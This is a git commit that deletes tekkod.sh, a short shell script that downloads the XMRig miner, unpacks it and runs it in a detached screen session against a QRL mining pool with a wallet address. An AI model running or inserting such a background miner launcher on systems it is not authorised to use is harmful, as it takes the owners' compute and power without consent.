4a2d638b2aed3aa7d1b952975da7dfea337246f1
josephderler <fareler72@gmail.com>
2025-09-20 00:45:17 +0300

    Delete tekkod.sh

--- tekkod.sh
+++
@@ -1,8 +0,0 @@
-apt-get update -y
-apt install screen -y
-wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-linux-static-x64.tar.gz 
-tar -xf xmrig-6.24.0-linux-static-x64.tar.gz
-cd xmrig-6.24.0-linux-static-x64
-screen -dmS mine ./xmrig-6.24.0/xmrig --donate-level 1 -o de.qrl.herominers.com:1166 -u Q010500b66b5ee1221f7a748a73665d4e1daf3a3e170791d9077b0c0d9b84de87846ef6fb42d69e
-
-
